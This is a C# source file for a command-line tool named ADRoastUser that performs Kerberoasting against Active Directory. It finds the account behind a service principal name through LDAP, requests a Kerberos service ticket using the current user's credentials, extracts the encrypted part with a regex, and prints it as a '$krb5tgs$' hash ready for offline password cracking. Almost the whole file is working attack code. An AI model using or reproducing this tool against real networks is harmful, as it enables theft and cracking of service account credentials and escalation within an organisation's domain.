using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Net;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Security.Authentication;
using System.Security.Principal;
using System.IdentityModel.Selectors;
using System.IdentityModel.Tokens;

namespace ADRoastUser
{
    class UserInfo
    {
        public string samaccountname = "",displayName = "",distinguishedName = "";
    }

    class Program
    {
        public static void GetUserInfo(UserInfo userinfo, string namingContext, string spn)
        {

            using ( DirectoryEntry de = new DirectoryEntry (
                        string.Format ( "LDAP://{0}", namingContext ),
                        null,
                        null,
                        AuthenticationTypes.Secure
                    ))
            {
                string LDAPFilter = string.Format ( "(&(objectClass=user)(sAMAccountType=805306368)(servicePrincipalName={0}))", spn );

                DirectorySearcher ds = new DirectorySearcher ( de, LDAPFilter );

                ds.PropertiesToLoad.Add("samaccountname");
                ds.PropertiesToLoad.Add("displayname");
                ds.PropertiesToLoad.Add("distinguishedName");
                
                using ( SearchResultCollection src = ds.FindAll() )
                {   
                    if ( src.Count == 1 )
                    {
                        foreach ( SearchResult sr in src )
                        {
                            userinfo.samaccountname = (sr.Properties["samaccountname"][0]).ToString().Trim();
                            userinfo.displayName = (sr.Properties["displayName"][0]).ToString().Trim();
                            userinfo.distinguishedName = (sr.Properties["distinguishedName"][0]).ToString().Trim();
                        }
                    }
                }
            }
        }

        public static void Main(string[] args)
        {

            if ( (args.Length == 0) || (args.Length == 1) || (args.Length > 2))
            {
                Console.WriteLine("\n[?] Usage: ADRoastUser.exe [defaultNamingContext] [servicePrincipalName]\n");
                System.Environment.Exit(0);
            }
            
            string defaultNamingContext = args[0];
            string spn = args[1];

            UserInfo userinfo = new UserInfo();

            GetUserInfo(userinfo,defaultNamingContext,spn);

            if ( userinfo.samaccountname == "null")
            {
                Console.WriteLine("\n[!!] ERROR - No User identified for given DefaultNamingContext / SPN given.\n");
                System.Environment.Exit(0);
            }

            Console.WriteLine();
            Console.WriteLine(string.Format("[*] samAccountName:\t\t{0}",userinfo.samaccountname));
            Console.WriteLine(string.Format("[*] displayName:\t\t{0}",userinfo.displayName));
            Console.WriteLine(string.Format("[*] distinguishedName:\t\t{0}",userinfo.distinguishedName));
            Console.WriteLine(string.Format("[*] servicePrincipalName:\t{0}",spn));
            
            string domain = defaultNamingContext.Replace("DC=","").Replace("dc=","").Replace(",",".");
            
            using (var domainContext = new PrincipalContext(ContextType.Domain, domain))
            {
                Console.WriteLine();
                Console.WriteLine(string.Format("[*] Server:\t{0}",domainContext.ConnectedServer));
                Console.WriteLine(string.Format("[*] Name:\t{0}",domainContext.Name));
                
                KerberosSecurityTokenProvider tokenProvider = new KerberosSecurityTokenProvider(spn, 
                                                                                                System.Security.Principal.TokenImpersonationLevel.Impersonation, 
                                                                                                CredentialCache.DefaultNetworkCredentials);

                KerberosRequestorSecurityToken ticket = tokenProvider.GetToken(TimeSpan.FromMinutes(1)) as KerberosRequestorSecurityToken;
                
                Console.WriteLine();
                Console.WriteLine(string.Format("[*] Id:\t\t\t{0}",ticket.Id));
                Console.WriteLine(string.Format("[*] SecurityKey:\t{0}",ticket.SecurityKey.GetHashCode()));
                Console.WriteLine(string.Format("[*] SecurityKeys:\t{0}",ticket.SecurityKeys.GetHashCode()));
                Console.WriteLine(string.Format("[*] SPN:\t\t{0}",ticket.ServicePrincipalName));
                Console.WriteLine(string.Format("[*] ValidFrom:\t\t{0}",ticket.ValidFrom));
                Console.WriteLine(string.Format("[*] ValidTo:\t\t{0}",ticket.ValidTo));

                byte[] ticketBytes = ticket.GetRequest();
                
                string ticketHexStream = System.BitConverter.ToString(ticketBytes).Replace(@"-",@"");
                
                Match match = Regex.Match(ticketHexStream,@"a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)",RegexOptions.IgnoreCase);

                if ( match.Success )
                { 

                    byte eType = Convert.ToByte(match.Groups["EtypeLen"].ToString(),16);

                    int cipherTextLen = Convert.ToInt32(match.Groups["CipherTextLen"].ToString(), 16) - 4;
                    string dataToEnd = match.Groups["DataToEnd"].ToString();
                    string cipherText = dataToEnd.Substring(0,cipherTextLen * 2);

                    if ( match.Groups["DataToEnd"].ToString().Substring(cipherTextLen * 2, 4) == "A482")
                    {
                        string hash = string.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", eType,
                                                                                          userinfo.samaccountname,
                                                                                          domain,
                                                                                          spn,
                                                                                          cipherText.Substring(0,32),
                                                                                          cipherText.Substring(32));

                        Console.WriteLine();
                        Console.WriteLine(string.Format("[*] Hash:\t{0}",hash));
                    }
                }
                else
                {
                    Console.WriteLine("[!!] ERROR : Request for SPN failed.\n");
                }
        
                Console.WriteLine();
            }            
        
        }   
    }
}
